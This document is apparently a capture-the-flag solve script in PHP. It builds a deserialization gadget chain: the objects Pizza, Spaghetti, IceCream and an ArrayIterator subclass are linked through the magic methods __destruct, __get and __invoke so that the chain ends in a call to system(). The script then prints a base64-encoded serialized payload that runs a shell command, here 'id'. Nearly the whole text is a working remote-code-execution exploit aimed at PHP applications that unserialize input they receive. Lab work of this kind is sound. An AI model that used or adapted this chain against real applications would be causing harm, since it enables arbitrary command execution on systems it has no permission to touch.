

### Solve Script:
```php
namespace Helpers{
    use \ArrayIterator;

    class ArrayHelpers extends ArrayIterator
    {
        public $callback = "system";  // Set callback to "system"

        public function current()
        {
            $value = parent::current();  // Fetch the current value
            echo $value."\n";           
            echo $this->callback."\n";  
            call_user_func($this->callback, $value);  // Executes system($value)
            return $value;
        }
    }
}

namespace{
    class Spaghetti
    {
        public $sauce;

        public function __construct()
        {
            echo "I am a spaghetti\n";
            echo "Payload is: \n";
            $this->sauce = new IceCream();  // Assigns an IceCream object to $sauce
        }

        public function __get($tomato)
        {
            ($this->sauce)();  // Triggers IceCream's __invoke()
        }
    }

    class Pizza
    {
        public function __construct()
        {   
            $this->size = new Spaghetti();  // Assigns a Spaghetti object to $size
            $this->price = "testtest";
            $this->cheese = "Y";        
        }

        public function __destruct()
        {
            echo $this->size->what;  // Triggers Spaghetti's __get($tomato)
        }
    }

    class IceCream
    {
        public $flavors;

        public function __construct()
        {   
            $this->flavors = new Helpers\ArrayHelpers(["id"]);  
        }

        public function __invoke()
        {   
            echo "\nI am in the function\n";
            foreach ($this->flavors as $flavor) {  
                echo $flavor;
            }
        }
    }

    $obj = new Pizza();
    echo base64_encode(serialize($obj));  
}
```